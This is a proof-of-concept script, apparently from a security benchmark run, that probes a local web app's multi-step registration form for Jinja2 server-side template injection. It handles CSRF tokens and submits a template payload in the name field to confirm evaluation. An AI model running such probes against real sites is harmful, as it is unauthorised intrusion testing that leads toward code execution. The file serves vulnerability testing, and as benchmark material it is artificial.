#!/bin/bash
# POC: Server-Side Template Injection (SSTI) in registration name field via Jinja2 template evaluation. Demonstrates CRITICAL RCE vulnerability by injecting Jinja2 template syntax into the name field.
# Target: ./repo
# Created: 2025-11-04T17:16:55.671Z
# Session: benchmark-XBEN-025-24-mhktlvhv

# SSTI in Registration Name Field - Final POC
# Using Python for better control over requests and sessions

python3 << 'EOF'
import sys
import requests
from bs4 import BeautifulSoup

TARGET = "http://localhost"
PAYLOAD = 'Test{%if 1%}PWNED{%endif%}'

print("[*] SSTI Registration Name Field POC")
print(f"[*] Target: {TARGET}")
print(f"[*] Payload: {PAYLOAD}")
print("")

try:
    session = requests.Session()
    
    # Step 1: Get initial form and CSRF token
    print("[*] Step 1: Fetching registration form...")
    resp = session.get(f'{TARGET}/accounts/register/step1/')
    
    if resp.status_code != 200:
        print(f"[-] Failed to fetch Step 1 form. Status: {resp.status_code}")
        sys.exit(1)
    
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
    
    if not csrf_input:
        print("[-] CSRF token not found in Step 1 form")
        sys.exit(1)
    
    csrf = csrf_input['value']
    print(f"[+] CSRF Token: {csrf[:20]}...")
    
    # Step 2: Submit Step 1 with SSTI payload
    print(f"[*] Step 2: Submitting form with payload: {PAYLOAD}")
    resp = session.post(
        f'{TARGET}/accounts/register/step1/',
        data={
            'csrfmiddlewaretoken': csrf,
            'name': PAYLOAD,
            'password': 'ValidPassword123'
        },
        allow_redirects=True
    )
    
    if resp.status_code != 200:
        print(f"[-] Step 1 POST failed. Status: {resp.status_code}")
        sys.exit(1)
    
    # Extract CSRF from Step 2 page
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
    
    if not csrf_input:
        print("[-] CSRF token not found in Step 2 form")
        print("[*] Response contains:")
        print(resp.text[:500])
        sys.exit(1)
    
    csrf2 = csrf_input['value']
    print(f"[+] Step 2 CSRF: {csrf2[:20]}...")
    
    # Step 3: Submit Step 2 with email
    print("[*] Step 3: Submitting email field...")
    resp = session.post(
        f'{TARGET}/accounts/register/step2/',
        data={
            'csrfmiddlewaretoken': csrf2,
            'email': 'test@example.com'
        },
        allow_redirects=True
    )
    
    if resp.status_code != 200:
        print(f"[-] Step 2 POST failed. Status: {resp.status_code}")
        sys.exit(1)
    
    # Step 4: Check for SSTI evidence
    print("[*] Checking Step 3 response for template evaluation...")
    print("")
    
    if "TestPWNED" in resp.text:
        print("[+] ============================================")
        print("[+] SSTI VULNERABILITY CONFIRMED")
        print("[+] ============================================")
        print("")
        print("[+] Evidence: Template syntax was evaluated server-side")
        print("[+] Input payload:  Test{%if 1%}PWNED{%endif%}")
        print("[+] Output result:  TestPWNED (template evaluated)")
        print("")
        
        # Extract vulnerable script tag
        import re
        match = re.search(r'<script>alert\([^)]*\)</script>', resp.text)
        if match:
            print("[+] Vulnerable JavaScript context:")
            print(f"    {match.group()}")
        
        print("")
        print("[!] IMPACT: Server-Side Template Injection (SSTI)")
        print("[!] - Jinja2 template evaluation on server-side")
        print("[!] - Attacker can execute arbitrary Python code")
        print("[!] - Full server compromise possible")
        print("")
        sys.exit(0)
    else:
        print("[-] SSTI pattern not detected in Step 3 response")
        print("[-] Response snippet:")
        # Show any alert() calls
        import re
        alerts = re.findall(r'<script>alert\([^)]*\)</script>', resp.text)
        if alerts:
            for alert in alerts[:3]:
                print(f"    {alert}")
        else:
            print("[-] No alert() found")
        print("")
        print(f"[-] Response length: {len(resp.text)} bytes")
        sys.exit(1)

except requests.exceptions.ConnectionError:
    print("[-] Connection error - target not reachable")
    sys.exit(1)
except Exception as e:
    print(f"[-] Error: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)
EOF